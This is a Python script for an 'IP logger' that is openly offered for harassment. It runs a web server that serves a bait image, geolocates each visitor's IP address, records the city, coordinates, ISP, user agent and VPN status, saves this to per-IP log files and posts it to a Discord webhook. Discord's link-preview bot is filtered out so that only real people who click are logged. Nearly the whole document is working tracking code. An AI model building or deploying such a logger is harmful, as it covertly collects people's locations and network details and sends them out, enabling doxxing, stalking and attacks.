# Made by ! zeroo#2801, skid and i send nukes 👍

import http.server
import socketserver
import os
import datetime
import requests
import geocoder
import json
import ipaddress
import urllib.parse

with open("stuff/setting.json", "r") as f:
  data = json.load(f)

webhook = data["webhook"]
logging = data["enable_logging"]
toggle_web = data["webhook_toggle"]
vpn_check = data["check_vpn"]
image = data["image_path"]
gif = data["gif_path"]
troll = data["troll_gif"]
toggle_log = data["save_txt"]

blacklisted_agents = ["Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"]

# modify if you have knowledge of python
class IPHandler(http.server.BaseHTTPRequestHandler):
    def _set_headers(self, content_type='text/html'):
        self.send_response(200)
        self.send_header('Content-type', content_type)
        self.end_headers()

    def serve_image(self, path):
        with open(path, 'rb') as file:
            self.send_response(200)
            self.send_header('Content-type', 'image/jpg')
            self.end_headers()
            self.wfile.write(file.read())

    def serve_gif(self, gif_path):
        with open(gif_path, 'rb') as file:
            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(file.read())

    def do_GET(self):
        parse_result = urllib.parse.urlparse(self.path)
        
        if parse_result.path == '/image.jpg' and troll:
            self.serve_gif(gif)
        else:
            self.serve_image(image)

            try:
                if 'X-Forwarded-For' in self.headers:
                    ip_real = self.headers['X-Forwarded-For'].split(',')[0]
                else:
                    ip_real = self.client_address[0]

                g = geocoder.ip(ip_real)
                lat, lng = g.latlng
                latitude = f'{lat}'
                longitude = f'{lng}'

        
                city = g.city
                region = g.state
                country = g.country
                org = g.org

                headers = self.headers
                user_agent = headers.get('User-Agent')
                host = headers.get('Host')
                encoding = headers.get('Accept-Encoding')

                if vpn_check:
                    is_proxy = headers.get('via') and headers.get('proxy-connection') and headers.get('X-Forwarded-For')

                is_vpn = False

                if vpn_check:
                    if ipaddress.ip_address(ip_real).is_private:
                        is_vpn = False
                    else:
                        headers_lower = {k.lower(): v for k, v in headers.items()}
                        is_cf_ip = headers_lower.get('http_cf_connecting_ip') is not None
                        is_x_forwarded = headers_lower.get('http_x_forwarded_for') is not None
                        is_via = headers_lower.get('via') is not None
                        is_forwarded = headers_lower.get('forwarded') is not None
                        is_proxy_conn = headers_lower.get('proxy-connection') is not None
                        is_user_agent = headers_lower.get('user-agent') is not None
        
                        if any([is_cf_ip, is_x_forwarded, is_via, is_forwarded, is_proxy_conn]):
                            is_vpn = True
                        elif any([is_proxy_conn or 'proxy' in ip_real.lower() or 'vpn' in ip_real.lower()]):
                            is_vpn = True
                        elif is_user_agent and 'vpn' in headers_lower['user-agent'].lower():
                            is_vpn = True

                        for proxy_header in ['smtp-proxy', 'proxy-agent', 'http_proxy', 'proxy_server', 'proxy_host', 'proxy_gateway']:
                            if headers_lower.get(proxy_header) is not None:
                                is_vpn = True

                if toggle_log:
                    if not os.path.exists(f"logs/{ip_real}"):
                        with open(f"logs/{ip_real}.txt", "w") as f:
                            f.write(f"IP address: {ip_real}\n")
                            f.write(f"Location: {city}, {region}, {country}\n")
                            f.write(f"Coordinates: {latitude}, {longitude}\n")
                            f.write(f"Organization: {org}\n")
                            f.write(f"User Agent: {user_agent}\n")
                            f.write(f"Host: {host}\n")
                            f.write(f"Accept Encoding: {encoding}\n")
                            if vpn_check:
                                f.write(f"Is Proxy: {bool(is_proxy)}\n")
                                f.write(f"Is VPN: {is_vpn}\n")
                    else:
                        with open(f"logs/{ip_real}.txt", "w") as f:
                            f.write(f"IP address: {ip_real}\n")
                            f.write(f"Location: {city}, {region}, {country}\n")
                            f.write(f"Coordinates: {latitude}, {longitude}\n")
                            f.write(f"Organization: {org}\n")
                            f.write(f"User Agent: {user_agent}\n")
                            f.write(f"Host: {host}\n")
                            f.write(f"Accept Encoding: {encoding}\n")
                            if vpn_check:
                                f.write(f"Is Proxy: {bool(is_proxy)}\n")
                                f.write(f"Is VPN: {is_vpn}\n")
       
                if is_vpn or is_proxy:
                    message = f"There's presence of a VPN.\n**User-Agent:** {user_agent}\n\n**Host:** {host}\n**Accept-Encoding:** {encoding}"
                    ip = f"{ip_real}"
                    url = f"https://whatismyipaddress.com/ip/{ip}"
                    color = 0xFFB6C1
                else:
                    message = f"**User-Agent:** {user_agent}\n\n\n**Host:** {host}\n**Accept-Encoding:** {encoding}"
                    ip = f"{ip_real}"
                    url = f"https://whatismyipaddress.com/ip/{ip}"
                    color = 0xFFB6C1
        
                if user_agent not in blacklisted_agents and org != "AS396982 Google LLC":
                    embed = {
                        "title": "**+leaks ip logger**",
                        "color": color,
                        "fields": [
                            {
                                "name": "IP Address",
                                "value": ip
                            },
                            {
                                "name": "Location",
                                "value": f"{city}, {region}, {country}\n{latitude}, {longitude}\n{org}"
                            },
                            {
                                "name": "More info",
                                "value": message
                            }
                        ],
                        "footer": {
                        "text": url
                        },
                        "thumbnail": {
                        "url": "https://media.discordapp.net/attachments/1098269219977695387/1100381884220977162/static.png"
                        }
                    }
                    payload = {
                        "embeds": [embed]
                    }
            
                    if toggle_web:
                        requests.post(webhook, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
                        print(f"Logged: {ip}")

            except Exception as e:
                print(f"error: {e}")
        
            self._set_headers()

PORT = 8000

with socketserver.TCPServer(('', PORT), IPHandler) as httpd:
    print(f'Server started on port {PORT}')
    httpd.serve_forever()